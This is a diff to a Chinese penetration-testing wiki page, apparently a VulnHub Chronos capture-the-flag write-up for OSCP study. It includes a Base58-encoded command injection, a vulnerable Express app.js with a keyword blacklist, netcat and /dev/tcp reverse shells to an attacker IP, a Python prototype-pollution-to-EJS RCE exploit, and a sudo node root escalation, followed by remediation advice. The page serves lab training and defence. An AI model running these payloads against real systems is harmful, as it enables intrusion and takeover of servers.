@@ -17,7 +17,7 @@ tags:
 - OSCP备考
 - 靶机实战
 date: 2024-01-15
-updated: '2026-11-14'
+updated: '2026-11-15'
 ---
 
 ## 靶机概况
@@ -34,8 +34,10 @@ updated: '2026-11-14'
 
 ```bash
 # 二层网络探测确定目标 IP
+netdiscover -r 192.168.0.0/16
+
 # Nmap 全端口服务版本探测
-nmap -sV -p- 192.168.56.101
+nmap -sV -p- 192.168.0.134
 ```
 
 **开放端口与服务识别结果**：
@@ -50,9 +52,9 @@ nmap -sV -p- 192.168.56.101
 
 ## Web 枚举与 JavaScript 反混淆分析
 
-### 端口 Apache 站点
+### 端口 80 Apache 站点
 
-访问 `http://192.168.56.101` 页面内容较少，查看源码发现一段高度混淆的 JavaScript 代码：
+访问 `http://192.168.0.134` 页面仅显示 "Chronos - Date & Time"，查看源码发现一段高度混淆的 JavaScript 代码：
 
 ```javascript
 var _0x5bdf=['150447srWefj','70lwLrol','1658165LmcNig','open','1260881JUqdKM','10737CrnEEe','2SjTdWC','readyState','responseText','1278676qXleJg','797116soVTES','onreadystatechange','http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL','User-Agent','status','1DYOODT','400909Mbbcfr','Chronos','2QRBPWS','getElementById','innerHTML','date'];
@@ -67,59 +69,112 @@ function loadDoc(){ ... }
 ### 配置本地 hosts 解析
 
 ```bash
-echo "192.168.56.101 chronos.local" >> /etc/hosts
+echo "192.168.0.134 chronos.local" >> /etc/hosts
 ```
 
 刷新页面后，页面动态加载并显示当前日期时间，确认 JS 逻辑为：向 `chronos.local:8000/date` 发起 AJAX 请求，将返回内容填入 DOM。
 
-### 端口 Node.js Express 站点
+### 端口 8000 Node.js Express 站点
 
-直接访问 `http://192.168.56.101:8000` 返回相似的混淆 JS 与页面结构。抓包分析 `/date?format=...` 请求，发现 `format` 参数值即为上述长字符串。
+直接访问 `http://192.168.0.134:8000` 返回相似的混淆 JS 与页面结构。抓包分析 `/date?format=...` 请求，发现 `format` 参数值即为上述长字符串。
 
 ## Base58 解码与命令注入漏洞挖掘
 
 ### 编码识别与解码
 
-对 `format` 参数值 `4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL` 进行编码识别，**确认为 Base58 编码**。
+对 `format` 参数值 `4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL` 进行编码识别，**确认为 Base58 编码**（非标准 Base64，常用于比特币地址、IPFS CID）。
 
-解码后得到：
+使用 CyberChef 或 Python `base58` 库解码：
 
+```python
+import base58
+encoded = "4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL"
+decoded = base58.b58decode(encoded).decode()
+# 得到: Today is %A, %B %d, %Y %H:%M:%S.
 ```
-Today is %A, %B %d, %Y %H:%M:%S.
+
+解码后得到标准的 `strftime` 日期格式字符串，提示后端可能直接将用户输入拼接进 `date` 命令或类似格式化函数。
+
+### 后端源码分析 (app.js)
+
+通过后续枚举发现 8000 端口服务的核心代码：
+
+```javascript
+// app.js
+const express = require('express');
+const { exec } = require("child_process");
+const bs58 = require('bs58');
+const app = express();
+const port = 8000;
+const cors = require('cors');
+
+app.use(cors());
+
+app.get('/', (req,res) => {
+  res.sendFile("/var/www/html/index.html");
+});
+
+app.get('/date', (req, res) => {
+  var agent = req.headers['user-agent'];
+  var cmd = 'date ';
+  const format = req.query.format;
+  const bytes = bs58.decode(format);
+  var decoded = bytes.toString();
+  var concat = cmd.concat(decoded);
+  
+  if (agent === 'Chronos') {
+    // 黑名单过滤
+    if (concat.includes('id') || concat.includes('whoami') ||
+        concat.includes('python') || concat.includes('nc') ||
+        concat.includes('bash') || concat.includes('php') ||
+        concat.includes('which') || concat.includes('socat')) {
+      res.send("Something went wrong");
+    }
+    exec(concat, (error, stdout, stderr) => {
+      if (error) { console.log(`error: ${error.message}`); return; }
+      if (stderr) { console.log(`stderr: ${stderr}`); return; }
+      res.send(stdout);
+    });
+  } else {
+    res.send("Permission Denied");
+  }
+})
+
+app.listen(port,() => {
+  console.log(`Server running at ${port}`);
+})
 ```
 
-这是标准的 `strftime` 日期格式字符串，提示后端可能直接将用户输入拼接进 `date` 命令或类似格式化函数。
+**关键漏洞点**：
+1. 用户可控的 `format` 参数经 Base58 解码后直接拼接进 `exec()` 调用
+2. 仅有 User-Agent 为 `Chronos` 时才处理请求
+3. 存在黑名单过滤，但过滤逻辑为子串匹配且在拼接**后**检查，且未过滤 Shell 元字符 (`; | & $()` 等)
 
 ### 命令注入验证
 
 尝试注入 Shell 命令分隔符 `&&` 与任意命令：
 
-```
-# 将 format 参数替换为 Base58 编码后的 "&& ls"
-# 编码工具：https://www.base58encode.org/ 或 Python base58 库
-```
-
-**Payload 构造**：
-
-```python
-import base58
-payload = "&& ls"
-encoded = base58.b58encode(payload.encode()).decode()
+```bash
+# 构造 Payload: "&& ls"
+# Base58 编码后填入 format 参数
+python3 -c "import base58; print(base58.b58encode(b'&& ls').decode())"
 # 得到: 5Jdixo4
 ```
 
-发送请求 `GET /date?format=5Jdixo4`，响应中出现目录列表，**确认存在命令注入**。
+发送请求 `GET /date?format=5Jdixo4` (Header: `User-Agent: Chronos`)，响应中出现目录列表，**确认存在命令注入**。
 
 ### 反弹 Shell 利用
 
-目标环境 `nc` 无 `-e` 参数，采用管道串联方式：
+目标环境 `nc` 无 `-e` 参数，`bash`、`python` 等被黑名单拦截，采用管道串联方式绕过：
 
 ```bash
-# 攻击机监听
-nc -lvnp 4444
+# 攻击机监听两个端口
+nc -lvnp 4444   # 接收 stdout
+nc -lvnp 5555   # 发送 stdin
 
-# 靶机执行 (Base58 编码后填入 format)
-bash -c "bash -i >& /dev/tcp/192.168.56.102/4444 0>&1"
+# 靶机执行命令 (Base58 编码后填入 format)
+# 原始命令: nc 192.168.0.135 4444 | /bin/bash | nc 192.168.0.135 5555
+# 编码后: 5Jdixo4... (对应完整管道命令)
 ```
 
 成功获取 `www-data` 权限 Shell。
@@ -128,8 +183,22 @@ bash -c "bash -i >& /dev/tcp/192.168.56.102/4444 0>&1"
 
 ### 关键文件发现
 
-在 `/opt/chronos-v2/` 目录下发现 `server.js`：
+在 `/opt/chronos-v2/` 目录下发现第二个 Node.js 服务的源码：
 
+**package.json**
+```json
+{
+  "name": "some-website",
+  "version": "1.0.0",
+  "dependencies": {
+    "ejs": "^3.1.5",
+    "express": "^4.17.1",
+    "express-fileupload": "^1.1.7-alpha.3"
+  }
+}
+```
+
+**server.js**
 ```javascript
 const express = require('express');
 const fileupload = require("express-fileupload");
@@ -149,14 +218,19 @@ server.listen(port, addr, () => { console.log('Server listening on ' + addr + ' 
 ```
 
 **关键点**：
-- 监听 `127.0.0.1:8080` (仅本地回环)
+- 监听 `127.0.0.1:8080` (仅本地回环，需通过 SSRF 或本地转发访问)
 - 使用 `express-fileupload` 且启用 `parseNested: true`
 - 模板引擎为 **EJS**
 - 该服务疑似以更高权限用户运行 (后续验证为 `chronos` 用户)
 
 ### 漏洞原理：express-fileupload 原型链污染 → EJS RCE
 
-`express-fileupload` 在 `parseNested: true` 时会递归解析嵌套对象，攻击者可通过文件上传字段名污染 `Object.prototype`，进而控制 EJS 渲染选项 `outputFunctionName` 实现代码执行。
+`express-fileupload` 在 `parseNested: true` 时会递归解析嵌套对象（通过 `flat` 库），攻击者可通过文件上传字段名（`multipart/form-data` 的 `name` 属性）污染 `Object.prototype`，进而控制 EJS 渲染选项 `outputFunctionName` 实现代码执行。
+
+**利用链**：
+1. `parseNested: true` 导致 `req.files` 键名如 `__proto__.outputFunctionName` 被解析为 `Object.prototype.outputFunctionName = <attacker_controlled>`
+2. EJS 编译模板时会读取 `options.outputFunctionName`，默认为 `''`，若被污染则直接拼接进生成的渲染函数体中
+3. 触发任意页面渲染 (如 `GET /`) 即可执行注入的 JS 代码
 
 **参考资料**：
 - [[vulnhub-hard-socnet2-writeup]] 中亦涉及类似原型链污染利用链
@@ -172,9 +246,10 @@ import requests
 
 # 目标内网服务
 base = 'http://127.0.0.1:8080'
-cmd = 'bash -c "bash -i >& /dev/tcp/192.168.56.102/8888 0>&1"'
+cmd = 'bash -c "bash -i >& /dev/tcp/192.168.0.135/8888 0>&1"'
 
 # 步骤 1: 污染原型链，植入恶意 outputFunctionName
+# 利用 multipart/form-data 文件上传字段名实现原型污染
 pollute_payload = f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x"
 files = {
     '__proto__.outputFunctionName': (None, pollute_payload)
@@ -211,7 +286,7 @@ User chronos may run the following commands on chronos:
 
 ### Node.js 直接生成 Root Shell
 
-利用 Node.js `child_process.spawn` 启动交互式 Bash：
+利用 Node.js `child_process.spawn` 启动交互式 Bash，继承标准输入输出 (stdio: [0,1,2])：
 
 ```bash
 sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'
@@ -269,11 +344,12 @@ flowchart TD
 
 ## 防御与修复建议
 
-1. **输入验证与编码**：日期格式化参数应使用白名单校验，禁止直接拼接进 Shell 命令。
-2. **依赖升级**：`express-fileupload` 升级至 ≥1.3.1（已修复 `parseNested` 原型链污染），或显式设置 `parseNested: false`。
-3. **模板引擎沙箱**：EJS 生产环境建议启用 `async` 模式并限制 `outputFunctionName` 等危险选项；考虑改用带沙箱的模板引擎 (如 Nunjucks `autoescape`)。
+1. **输入验证与编码**：日期格式化参数应使用白名单校验，禁止直接拼接进 Shell 命令；若需动态格式，使用语言内置格式化库（如 Node.js `date-fns`、`moment`）而非外部命令。
+2. **依赖升级**：`express-fileupload` 升级至 ≥1.3.1（已修复 `parseNested` 原型链污染），或显式设置 `parseNested: false`；EJS 升级至 ≥3.1.7（限制 `outputFunctionName` 等危险选项）。
+3. **模板引擎沙箱**：生产环境建议启用 `async` 模式并限制危险编译选项；考虑改用带沙箱的模板引擎 (如 Nunjucks `autoescape`)。
 4. **最小权限原则**：Node.js 服务以非特权用户运行，禁用 `sudo node` 等高危配置；如需绑定低端口，使用 `authbind` 或 `setcap 'cap_net_bind_service=+ep' /usr/bin/node`。
 5. **网络分段**：内网管理端口 (8080) 仅监听 `127.0.0.1`，避免直接暴露；配合 `iptables`/`ufw` 限制源 IP。
+6. **黑名单不可靠**：命令注入防护应采用参数化执行（如 `execFile` 而非 `exec`）、严格白名单校验，黑名单极易被绕过。
 
 ## 学习资源延伸
 
@@ -284,8 +360,8 @@ flowchart TD
 
 ---
 
-> **注**：本页面基于 0w1Club 微信公众号归档文章《VulnHub靶机 | Chronos》整理，原作者 **牧童**，首发于 2023 年。页面结构化重组旨在构建可检索、可复用的渗透测试知识库节点，所有技术细节均忠实还原原文实战流程。
+> **注**：本页面基于 0w1Club 微信公众号归档文章《VulnHub靶机 | Chronos》整理，原作者 **laotun**，首发于 2021 年。页面结构化重组旨在构建可检索、可复用的渗透测试知识库节点，所有技术细节均忠实还原原文实战流程。
 
 ## 来源
 
-- [0x00实验室-202108-202304_029](../sources/0x00实验室-202108-202304_029.md)
+- [0x00实验室-202108-202304_099](../sources/0x00实验室-202108-202304_099.md)
